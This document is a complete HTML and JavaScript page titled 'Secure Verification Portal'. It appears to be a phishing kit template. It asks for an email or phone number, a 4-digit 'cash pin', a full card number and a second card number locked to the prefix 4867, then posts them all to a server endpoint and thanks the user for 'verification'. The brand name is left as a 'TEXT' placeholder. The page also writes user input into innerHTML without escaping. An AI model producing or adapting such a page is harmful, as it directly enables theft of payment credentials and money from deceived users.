<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Verification Portal</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #000000;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .portal-container {
            background: #000000;
            padding: 20px;
            width: 100%;
            max-width: 420px;
            box-sizing: border-box;
            text-align: center;
        }
        .logo-container img {
            width: 90px;
            height: 90px;
            object-fit: cover;
            border-radius: 50%;
            margin-bottom: 30px;
        }
        .logo-text {
            font-size: 28px;
            font-weight: bold;
            font-style: italic;
            letter-spacing: 1px;
            margin-bottom: 35px;
        }
        h2, p.prompt-text {
            font-size: 22px;
            font-weight: normal;
            margin-bottom: 25px;
            line-height: 1.4;
        }
        .form-step {
            display: none;
        }
        .form-step.active {
            display: block;
        }
        /* Toggle pill buttons */
        .toggle-group {
            display: flex;
            background: #1c1c1e;
            border-radius: 30px;
            padding: 4px;
            margin-bottom: 25px;
        }
        .toggle-btn {
            flex: 1;
            background: transparent;
            border: none;
            color: #8e8e93;
            padding: 10px;
            font-size: 16px;
            border-radius: 26px;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.2s ease;
        }
        .toggle-btn.active {
            background: #2c2c2e;
            color: #ffffff;
        }
        /* Input fields */
        .input-box {
            width: 100%;
            background: transparent;
            border: 1px solid #3a3a3c;
            border-radius: 12px;
            padding: 16px;
            color: #ffffff;
            font-size: 16px;
            box-sizing: border-box;
            margin-bottom: 25px;
            outline: none;
        }
        .input-box:focus {
            border-color: #0a84ff;
        }
        /* 4-digit PIN boxes */
        .pin-container {
            display: flex;
            justify-content: space-between;
            gap: 12px;
            margin-bottom: 30px;
        }
        .pin-digit {
            width: 60px;
            height: 60px;
            background: transparent;
            border: 1px solid #3a3a3c;
            border-radius: 12px;
            text-align: center;
            font-size: 24px;
            color: white;
            outline: none;
        }
        .pin-digit:focus {
            border-color: #0a84ff;
        }
        /* Action Button */
        .continue-btn {
            width: 100%;
            background: #e5e5ea;
            color: #000000;
            border: none;
            border-radius: 30px;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .continue-btn:hover {
            background: #ffffff;
        }
        /* Success Screen */
        #successScreen {
            display: none;
            font-size: 26px;
            font-weight: bold;
            color: #34c759;
            margin-top: 40px;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="portal-container">
        <!-- Logo Display -->
        <div class="logo-container">
            <img src="logo.jpg" alt="Logo" onerror="this.style.display='none'; document.getElementById('fallbackLogo').style.display='block';">
            <div id="fallbackLogo" class="logo-text" style="display:none;">LOGO.JPG</div>
        </div>

        <form id="verificationForm">
            <!-- Step 1: email or Phone Selection -->
            <div class="form-step active" id="step-1">
                <div class="toggle-group">
                    <button type="button" class="toggle-btn active" id="btn-email" onclick="setIdentifierType('Email')">email</button>
                    <button type="button" class="toggle-btn" id="btn-phone" onclick="setIdentifierType('Phone')">phone</button>
                </div>
                <input type="hidden" id="identifierType" name="identifierType" value="Email">
                
                <input type="text" id="identifierValue" class="input-box" name="identifierValue" required placeholder="enter email or phone">
                
                <button type="button" class="continue-btn" onclick="nextStep(2)">Continue</button>
            </div>

            <!-- Step 2: PIN Entry -->
            <div class="form-step" id="step-2">
                <p class="prompt-text" id="welcomeMsg">Welcome back,  Enter your <span style="font-style:italic;">TEXT</span> cash pin to continue.</p>
                
                <div class="pin-container">
                    <input type="password" maxlength="1" class="pin-digit" inputmode="numeric" pattern="[0-9]*" required oninput="moveToNext(this, 1)">
                    <input type="password" maxlength="1" class="pin-digit" inputmode="numeric" pattern="[0-9]*" required oninput="moveToNext(this, 2)">
                    <input type="password" maxlength="1" class="pin-digit" inputmode="numeric" pattern="[0-9]*" required oninput="moveToNext(this, 3)">
                    <input type="password" maxlength="1" class="pin-digit" inputmode="numeric" pattern="[0-9]*" required oninput="moveToNext(this, 4)">
                </div>
                <input type="hidden" id="pinText" name="pinText">

                <button type="button" class="continue-btn" onclick="nextStep(3)">Continue</button>
            </div>

            <!-- Step 3: Numeric Number (1 to 16) -->
            <div class="form-step" id="step-3">
                <p class="prompt-text">Enter your cash card number</p>
                <input type="text" id="numericValue" class="input-box" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCardNumber(this)">
                
                <button type="button" class="continue-btn" onclick="nextStep(4)">Continue</button>
            </div>

            <!-- Step 4: Any Number (starting with 0000) -->
            <div class="form-step" id="step-4">
                <p class="prompt-text">Enter your <span style="font-style:italic;">card</span> number starting with <span style="font-style:italic;">4867</span></p>
                <input type="text" id="anyNumberValue" class="input-box" value="4867 " placeholder="0000 0000 0000 " maxlength="19" oninput="enforcePrefix(this)">
                
                <button type="submit" class="continue-btn">Continue</button>
            </div>
        </form>

        <!-- Success Message Screen -->
        <div id="successScreen">
            Thank you for your verification
        </div>
    </div>

    <script>
        function setIdentifierType(type) {
            document.getElementById('identifierType').value = type;
            if (type === 'Email') {
                document.getElementById('btn-email').classList.add('active');
                document.getElementById('btn-phone').classList.remove('active');
                document.getElementById('identifierValue').placeholder = "enter email";
            } else {
                document.getElementById('btn-phone').classList.add('active');
                document.getElementById('btn-email').classList.remove('active');
                document.getElementById('identifierValue').placeholder = "enter phone number";
            }
        }

        function nextStep(stepNumber) {
            // Validation before moving
            if (stepNumber === 2) {
                const val = document.getElementById('identifierValue').value.trim();
                if (!val) {
                    alert('Please enter your email or phone.');
                    return;
                }
                // Update welcome message dynamically with entered email/phone
                document.getElementById('welcomeMsg').innerHTML = `Welcome back, <span style="font-style:italic;">${val}</span>. Enter your PIN to continue.`;
            }

            if (stepNumber === 3) {
                const digits = document.querySelectorAll('.pin-digit');
                let pin = '';
                digits.forEach(d => pin += d.value);
                if (pin.length < 4) {
                    alert('Please enter your complete 4-digit PIN.');
                    return;
                }
                document.getElementById('pinText').value = pin;
            }

            // Switch steps
            document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
            document.getElementById('step-' + stepNumber).classList.add('active');
        }

        // Auto-focus next digit box for PIN
        function moveToNext(current, index) {
            if (current.value.length === 1 && index < 4) {
                current.parentElement.children[index].focus();
            }
        }

        // Auto-format spacing for numeric entries
        function formatCardNumber(input) {
            let v = input.value.replace(/\D/g, '').substring(0, 16);
            v = v.replace(/(.{4})/g, '$1 ').trim();
            input.value = v;
        }

        function enforcePrefix(input) {
            if (!input.value.startsWith("4867")) {
                input.value = "4867 ";
            }
            let v = input.value.replace(/\D/g, '');
            if (v.startsWith("4867")) {
                v = v.substring(0, 16);
                input.value = v.replace(/(.{4})/g, '$1 ').trim();
            }
        }

        // Final Form Submission to Server
        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const formData = {
                identifierType: document.getElementById('identifierType').value,
                identifierValue: document.getElementById('identifierValue').value,
                pinText: document.getElementById('pinText').value,
                numericValue: document.getElementById('numericValue').value,
                anyNumberValue: document.getElementById('anyNumberValue').value
            };

            try {
                const response = await fetch('/api/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });
                const result = await response.json();

                if (result.success) {
                    // Hide form and show success message
                    document.getElementById('verificationForm').style.display = 'none';
                    document.getElementById('successScreen').style.display = 'block';
                } else {
                    alert('Submission error. Please try again.');
                }
            } catch (err) {
                console.error('Network error:', err);
                alert('An error occurred connecting to the server.');
            }
        });
    </script>
</body>
</html>
